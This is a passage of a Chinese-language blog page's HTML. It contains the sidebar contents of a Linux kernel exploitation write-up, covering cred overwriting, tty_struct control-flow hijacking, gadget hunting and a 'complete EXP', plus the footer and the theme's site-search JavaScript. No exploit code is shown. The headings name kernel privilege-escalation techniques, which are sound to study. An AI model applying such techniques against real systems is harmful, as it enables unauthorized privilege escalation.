+          方法1 - 改子进程cred</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%AD%90%E8%BF%9B%E7%A8%8B%E4%B8%AD%E6%94%B9%E5%A0%86%E4%B8%AD%E5%86%85%E5%AE%B9"><span class="toc-text">
+          在子进程中改堆中内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%88%B6%E8%BF%9B%E7%A8%8B%E4%B8%AD%E6%94%B9%E5%A0%86%E4%B8%AD%E5%86%85%E5%AE%B9"><span class="toc-text">
+          在父进程中改堆中内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-tty-struct"><span class="toc-text">
+          方法2 - tty_struct</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="toc-text">
+          劫持控制流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadget"><span class="toc-text">
+          寻找gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-text">
+          完整EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">
+          其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cpio%E8%A7%A3%E5%8E%8B%E4%B8%8E%E5%8E%8B%E7%BC%A9"><span class="toc-text">
+          cpio解压与压缩</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86bzImage%E8%BD%AC%E5%8C%96%E6%88%90vmlinux"><span class="toc-text">
+          将bzImage转化成vmlinux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ko%E4%BB%A3%E7%A0%81%E6%AE%B5%E4%B8%8Ebss%E6%AE%B5%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          ko代码段与bss段的地址</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">28</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
